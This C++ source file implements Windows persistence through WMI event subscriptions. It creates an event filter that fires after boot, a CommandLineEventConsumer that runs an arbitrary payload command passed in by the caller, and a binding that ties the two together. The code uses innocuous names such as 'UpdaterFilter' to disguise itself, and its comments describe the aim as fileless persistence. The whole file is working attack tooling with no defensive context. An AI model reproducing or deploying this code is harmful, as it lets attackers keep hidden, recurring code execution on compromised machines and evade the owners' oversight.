#include <windows.h>
#include <stdio.h>
#include <wbemidl.h>

#pragma comment(lib, "wbemuuid.lib")

// WMI Persistence Implementation
// Uses WMI Event Subscriptions to achieve fileless persistence.

bool InstallWMIPersistence(const wchar_t* payloadCommand) {
    HRESULT hres;

    // 1. Initialize COM
    hres = CoInitializeEx(0, COINIT_MULTITHREADED);
    if (FAILED(hres)) return false;

    hres = CoInitializeSecurity(NULL, -1, NULL, NULL, RPC_C_AUTHN_LEVEL_DEFAULT, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_NONE, NULL);
    if (FAILED(hres)) {
        CoUninitialize();
        return false;
    }

    // 2. Connect to WMI namespace
    IWbemLocator* pLoc = NULL;
    hres = CoCreateInstance(CLSID_WbemLocator, 0, CLSCTX_INPROC_SERVER, IID_IWbemLocator, (LPVOID*)&pLoc);
    if (FAILED(hres)) {
        CoUninitialize();
        return false;
    }

    IWbemServices* pSvc = NULL;
    hres = pLoc->ConnectServer(_bstr_t(L"ROOT\\CIMV2"), NULL, NULL, 0, NULL, 0, 0, &pSvc);
    if (FAILED(hres)) {
        pLoc->Release();
        CoUninitialize();
        return false;
    }

    hres = CoSetProxyBlanket(pSvc, RPC_C_AUTHN_WINNT, RPC_C_AUTHZ_NONE, NULL, RPC_C_AUTHN_LEVEL_CALL, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_NONE);
    if (FAILED(hres)) {
        pSvc->Release();
        pLoc->Release();
        CoUninitialize();
        return false;
    }

    // 3. Create Event Filter (Trigger on system startup/uptime)
    IWbemClassObject* pFilterClass = NULL;
    pSvc->GetObject(_bstr_t(L"__EventFilter"), 0, NULL, &pFilterClass, NULL);
    IWbemClassObject* pFilterInstance = NULL;
    pFilterClass->SpawnInstance(0, &pFilterInstance);

    VARIANT vFilterName, vQuery, vQueryLang;
    VariantInit(&vFilterName); V_VT(&vFilterName) = VT_BSTR; V_BSTR(&vFilterName) = SysAllocString(L"UpdaterFilter");
    VariantInit(&vQuery); V_VT(&vQuery) = VT_BSTR; V_BSTR(&vQuery) = SysAllocString(L"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240");
    VariantInit(&vQueryLang); V_VT(&vQueryLang) = VT_BSTR; V_BSTR(&vQueryLang) = SysAllocString(L"WQL");

    pFilterInstance->Put(L"Name", 0, &vFilterName, 0);
    pFilterInstance->Put(L"Query", 0, &vQuery, 0);
    pFilterInstance->Put(L"QueryLanguage", 0, &vQueryLang, 0);

    pSvc->PutInstance(pFilterInstance, WBEM_FLAG_CREATE_OR_UPDATE, NULL, NULL);

    // 4. Create Event Consumer (CommandLineEventConsumer)
    IWbemClassObject* pConsumerClass = NULL;
    pSvc->GetObject(_bstr_t(L"CommandLineEventConsumer"), 0, NULL, &pConsumerClass, NULL);
    IWbemClassObject* pConsumerInstance = NULL;
    pConsumerClass->SpawnInstance(0, &pConsumerInstance);

    VARIANT vConsumerName, vCommandLine;
    VariantInit(&vConsumerName); V_VT(&vConsumerName) = VT_BSTR; V_BSTR(&vConsumerName) = SysAllocString(L"UpdaterConsumer");
    VariantInit(&vCommandLine); V_VT(&vCommandLine) = VT_BSTR; V_BSTR(&vCommandLine) = SysAllocString(payloadCommand);

    pConsumerInstance->Put(L"Name", 0, &vConsumerName, 0);
    pConsumerInstance->Put(L"CommandLineTemplate", 0, &vCommandLine, 0);

    pSvc->PutInstance(pConsumerInstance, WBEM_FLAG_CREATE_OR_UPDATE, NULL, NULL);

    // 5. Bind Filter and Consumer (__FilterToConsumerBinding)
    IWbemClassObject* pBindingClass = NULL;
    pSvc->GetObject(_bstr_t(L"__FilterToConsumerBinding"), 0, NULL, &pBindingClass, NULL);
    IWbemClassObject* pBindingInstance = NULL;
    pBindingClass->SpawnInstance(0, &pBindingInstance);

    VARIANT vFilterPath, vConsumerPath;
    VariantInit(&vFilterPath); V_VT(&vFilterPath) = VT_BSTR; V_BSTR(&vFilterPath) = SysAllocString(L"__EventFilter.Name=\"UpdaterFilter\"");
    VariantInit(&vConsumerPath); V_VT(&vConsumerPath) = VT_BSTR; V_BSTR(&vConsumerPath) = SysAllocString(L"CommandLineEventConsumer.Name=\"UpdaterConsumer\"");

    pBindingInstance->Put(L"Filter", 0, &vFilterPath, 0);
    pBindingInstance->Put(L"Consumer", 0, &vConsumerPath, 0);

    pSvc->PutInstance(pBindingInstance, WBEM_FLAG_CREATE_OR_UPDATE, NULL, NULL);

    printf("[+] WMI Persistence installed successfully.\n");

    // Cleanup
    VariantClear(&vFilterName); VariantClear(&vQuery); VariantClear(&vQueryLang);
    VariantClear(&vConsumerName); VariantClear(&vCommandLine);
    VariantClear(&vFilterPath); VariantClear(&vConsumerPath);
    pFilterInstance->Release(); pFilterClass->Release();
    pConsumerInstance->Release(); pConsumerClass->Release();
    pBindingInstance->Release(); pBindingClass->Release();
    pSvc->Release(); pLoc->Release();
    CoUninitialize();

    return true;
}
